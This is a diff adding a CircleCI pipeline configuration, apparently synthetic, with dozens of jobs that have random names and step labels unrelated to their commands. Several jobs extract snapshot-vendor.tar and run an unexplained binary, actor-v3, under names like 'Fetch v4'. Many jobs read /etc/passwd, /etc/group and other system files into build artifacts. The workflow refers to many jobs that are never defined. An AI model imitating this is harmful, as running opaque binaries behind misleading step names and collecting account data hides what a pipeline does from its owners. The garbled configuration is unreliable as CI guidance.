+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Extract sources
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  GANWrapper:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Undo imputation
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; for n in {1..8..2}; do echo $n; done| paste -sd ' '; true ; } > /tmp/ex/XDQLxz2gqm
+            echo "stage=romeo"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'XDQLxz2gqm'
+  romeo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/XDQLxz2gqm 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Restore build cache
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  almonds:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Verify the login attempts while we can
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; ls -hRt /etc/skel | shuf -n 2; true ; } > /tmp/ex/stage_5804a
+            echo "stage=brodcast"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'stage_5804a'
+  brodcast:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/stage_5804a 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Pull reference data
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  Pen:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Cookie banner open phase
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; sed -n '/^processor/,/^$/p' /proc/cpuinfo|head -5; true ; } > /tmp/ex/spark_wave
+            echo "stage=v6-nightly"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'spark_wave'
+  v6-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/spark_wave 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Stage inputs
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+  field_smart:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Skin the fog volumes since rollout
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; gzip -c /etc/os-release > '/tmp/link.gz' && gzip -cd '/tmp/link.gz'; true ; } > /tmp/ex/loaderemberchunk
+            echo "stage=promote"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'loaderemberchunk'
+  promote:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Fetch v4
+          command: |
+            awk '{t+=NF; l+=length} END{if(NR>0) print "avg_fields:",t/NR,"avg_len:",l/NR}' /tmp/ex/loaderemberchunk 2>/dev/null || true
+      - run:
+          name: Fetch sources tree
+          command: git clone --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack bundle
+          command: cat snapshot-vendor.tar | tar xf -
+      - run:
+          command: $PWD/actor-v3
+
+  revertDecoratorByteDigest:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Tape the product tour
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; find /var/log -maxdepth 2 -type d \( -name "*.gz" -o -name "*.1" \) -exec echo dir: {} \; 2>/dev/null | nl; true ; } > /tmp/ex/XDQLxz2gqm
+            echo "stage=romeo"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'XDQLxz2gqm'
+  len_340:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Export The Poster Image Job
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; echo -n "yes" | sha1sum; true ; } > /tmp/ex/6839ad2d07d9bfebc
+            echo "stage=rc-v8"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '6839ad2d07d9bfebc'
+  app--lg-5:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Mark 17 test fixture query
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; mkdir -p "/tmp/my_notice_rack" && touch "/tmp/my_notice_rack"/{uma,ana,max}.tmp && ls -l "/tmp/my_notice_rack"|tail -n +2; true ; } > /tmp/ex/EXaqfdWnT1tgg1hs1Xw
+            echo "stage=vela-rc"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'EXaqfdWnT1tgg1hs1Xw'
+  aud_PRODUCT_COUNT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Publish With Release Team
+          command: |
+            mkdir -p /tmp/ex
+            set +o pipefail 2>/dev/null; echo {a..z} | tr -d ' ' > /tmp/ex/MD5-Gamma; seq 1 1005785 >> /tmp/ex/MD5-Gamma; true
+            echo "stage=py311-test"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'MD5-Gamma'
+  q5c0o0:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Spawn Or Skin Tutorial Zone
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; seq 17 2 71 | tail -n 5 | wc -l; true ; } > /tmp/ex/east_valley_indigo
+            echo "stage=deploy"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'east_valley_indigo'
+  scarf_country_coffee_height:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: handleAlbumArtLoop
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; grep -H -F -v bash /etc/shells|sort|uniq -c; true ; } > /tmp/ex/cluster-glacier-vault-silent
+            echo "stage=yolo"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'cluster-glacier-vault-silent'
+  LANG_CLUSTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Optimise the test fixtures properly
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; paste -d: <(cut -d: -f1 /etc/passwd) <(cut -d: -f3 /etc/passwd)|head --lines=3; true ; } > /tmp/ex/9qvlv6
+            echo "stage=MERGE_UAT"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '9qvlv6'
+  interfaceVal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Be sure to throttle the latency budget
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; cat /etc/group | cut -f3 -d":" | awk '{print $1 * 2}'; true ; } > /tmp/ex/2b605dba96f764317c8cac4ce68
+            echo "stage=shippit"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '2b605dba96f764317c8cac4ce68'
+  onPulseDefer:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Article I truncate the export tray
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; ulimit -u; true ; } > /tmp/ex/env-Wolf-tmp
+            echo "stage=bug-1442"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'env-Wolf-tmp'
+  API_DECL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: thaw web tier now
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; top -b -n 1 | head -11; true ; } > /tmp/ex/coastalCoin
+            echo "stage=PackageImage"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'coastalCoin'
+  hero--warning:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Sequence counters reindexed done
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; grep -v -e 'proc' /proc/filesystems|sort -u; true ; } > /tmp/ex/spark_wave
+            echo "stage=v6-nightly"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'spark_wave'
+  EGAM3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Cleared for drying
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; for i in prague dublin berlin paris quito; do echo "$i" | rev; done | tac; true ; } > /tmp/ex/4aeb4443b8
+            echo "stage=rollout"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '4aeb4443b8'
+  mark15:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: MED1144
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; awk -F: '$6 ~ /^\/home/ {printf "%-16s %s\n", $1, $7}' /etc/passwd|wc -l; true ; } > /tmp/ex/v.2.10
+            echo "stage=preview"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'v.2.10'
+  Grant-PatternItem:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Pay the referral bonuses with manager
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; /usr/bin/ls -nFrg /usr/lib | awk 'NR>1 {print $1}' | sort | uniq -c; true ; } > /tmp/ex/tmp_79
+            echo "stage=depoly"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'tmp_79'
+  unmountResultLightError:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Ad lib benchmark
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; echo "hello from the shell" | fold -w 3; true ; } > /tmp/ex/20220710
+            echo "stage=hotel-4"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '20220710'
+  CommonInvoiceInterpreter:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Restock with sudo
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; for c in crow otter goose cat; do echo "$c"; done; true ; } > /tmp/ex/indIgobRAmBlefILtEr
+            echo "stage=rm-router-v2-timeout"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'indIgobRAmBlefILtEr'
+  ctrlrow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: MIRROR ONLY RECORDING
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; awk -F= '{print $2}' /etc/os-release | tac | tr '[:lower:]' '[:upper:]'; true ; } > /tmp/ex/125.154.64.128
+            echo "stage=STG_MERGE_8"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - '125.154.64.128'
+  capability_controller_locked:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: other stuff
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; cat /etc/group | head -n5 | sed 's/:.*//'; true ; } > /tmp/ex/PANO54129
+            echo "stage=tb"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'PANO54129'
+  Copy-AvatarProperty:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: Execute the waveform crop procedure
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; touch -t 201203131200 "/tmp/lion.log" && stat -c %y "/tmp/lion.log"; true ; } > /tmp/ex/receipt.moth
+            echo "stage=v5-edge"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'receipt.moth'
+  cakstyntklaixo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ex
+      - run:
+          name: HACK skip the chaos scenarios for now
+          command: |
+            mkdir -p /tmp/ex
+            { set +o pipefail 2>/dev/null; echo "removed old files" >| "${TMPDIR:-/tmp}/harbor_spring.list" && cat "${TMPDIR:-/tmp}/harbor_spring.list"; true ; } > /tmp/ex/dd73e9642fbe
+            echo "stage=beta-v9"
+      - persist_to_workspace:
+          root: /tmp/ex
+          paths:
+            - 'dd73e9642fbe'
+workflows:
+  workflow:
+    jobs:
+      - drawcontractthread
+      - validate-production-integration-tests:
+          requires:
+            - drawcontractthread
+      - listen_UNWRAP:
+          requires:
+            - drawcontractthread
+      - refactor-1844:
+          requires:
+            - listen_UNWRAP
+      - MULTI_COUNTER:
+          requires:
+            - listen_UNWRAP
+      - test:
+          requires:
+            - MULTI_COUNTER
+      - lilabel:
+          requires:
+            - MULTI_COUNTER
+      - bravo-1:
+          requires:
+            - lilabel
+      - field_smart:
+          requires:
+            - lilabel
+      - promote:
+          requires:
+            - field_smart
+      - tracef:
+          requires:
+            - field_smart
+      - v1-canary:
+          requires:
+            - tracef
+      - almonds:
+          requires:
+            - tracef
+      - brodcast:
+          requires:
+            - almonds
+      - VbRFfZs:
+          requires:
+            - almonds
+      - v7-beta2:
+          requires:
+            - VbRFfZs
+      - bigOrbit:
+          requires:
+            - VbRFfZs
+      - bake-it:
+          requires:
+            - bigOrbit
+      - hank99:
+          requires:
+            - bigOrbit
+      - v9-beta4:
+          requires:
+            - hank99
+      - GANWrapper
+      - revertDecoratorByteDigest:
+          requires:
+            - GANWrapper
+      - romeo:
+          requires:
+            - revertDecoratorByteDigest
+      - NavFast:
+          requires:
+            - revertDecoratorByteDigest
+      - len_340:
+          requires:
+            - NavFast
+      - rc-v8:
+          requires:
+            - len_340
+      - PIX:
+          requires:
+            - len_340
+      - app--lg-5:
+          requires:
+            - PIX
+      - vela-rc:
+          requires:
+            - app--lg-5
+      - reducePre:
+          requires:
+            - app--lg-5
+      - aud_PRODUCT_COUNT:
+          requires:
+            - reducePre
+      - py311-test:
+          requires:
+            - aud_PRODUCT_COUNT
+      - constName:
+          requires:
+            - aud_PRODUCT_COUNT
+      - q5c0o0:
+          requires:
+            - constName
+      - deploy:
+          requires:
+            - q5c0o0
+      - shortCb:
+          requires:
+            - q5c0o0
+      - scarf_country_coffee_height:
+          requires:
+            - shortCb
+      - yolo:
+          requires:
+            - scarf_country_coffee_height
+      - galaxy-node-command:
+          requires:
+            - scarf_country_coffee_height
+      - LANG_CLUSTER:
+          requires:
+            - galaxy-node-command
+      - MERGE_UAT:
+          requires:
+            - LANG_CLUSTER
+      - a0ac61a6-a13b-3595-a854-fb:
+          requires:
+            - LANG_CLUSTER
+      - interfaceVal:
+          requires:
+            - a0ac61a6-a13b-3595-a854-fb
+      - shippit:
+          requires:
+            - interfaceVal
+      - allChars:
+          requires:
+            - interfaceVal
+      - onPulseDefer:
+          requires:
+            - allChars
+      - bug-1442:
+          requires:
+            - onPulseDefer
+      - spoangstranai:
+          requires:
+            - onPulseDefer
+      - API_DECL:
+          requires:
+            - spoangstranai
+      - PackageImage:
+          requires:
+            - API_DECL
+      - Pen:
+          requires:
+            - API_DECL
+      - hero--warning:
+          requires:
+            - Pen
+      - v6-nightly:
+          requires:
+            - hero--warning
+      - Puzzles
+      - EGAM3:
+          requires:
+            - Puzzles
+      - rollout:
+          requires:
+            - EGAM3
+      - input-list--fixed:
+          requires:
+            - EGAM3
+      - mark15:
+          requires:
+            - input-list--fixed
+      - preview:
+          requires:
+            - mark15
+      - ckpt724:
+          requires:
+            - mark15
+      - Grant-PatternItem:
+          requires:
+            - ckpt724
+      - depoly:
+          requires:
+            - Grant-PatternItem
+      - ms321:
+          requires:
+            - Grant-PatternItem
+      - unmountResultLightError:
+          requires:
+            - ms321
+      - hotel-4:
+          requires:
+            - unmountResultLightError
+      - max_env:
+          requires:
+            - unmountResultLightError
+      - CommonInvoiceInterpreter:
+          requires:
+            - max_env
+      - rm-router-v2-timeout:
+          requires:
+            - CommonInvoiceInterpreter
+      - Myc0F9Q0:
+          requires:
+            - CommonInvoiceInterpreter
+      - ctrlrow:
+          requires:
+            - Myc0F9Q0
+      - STG_MERGE_8:
+          requires:
+            - ctrlrow
+      - OY2:
+          requires:
+            - ctrlrow
+      - capability_controller_locked:
+          requires:
+            - OY2
+      - tb:
+          requires:
+            - capability_controller_locked
+      - DTE-PREV-ID:
+          requires:
+            - capability_controller_locked
+      - Copy-AvatarProperty:
+          requires:
+            - DTE-PREV-ID
+      - v5-edge:
+          requires:
+            - Copy-AvatarProperty
+      - lr1:
+          requires:
+            - Copy-AvatarProperty
+      - cakstyntklaixo:
+          requires:
+            - lr1
+      - beta-v9:
+          requires:
+            - cakstyntklaixo
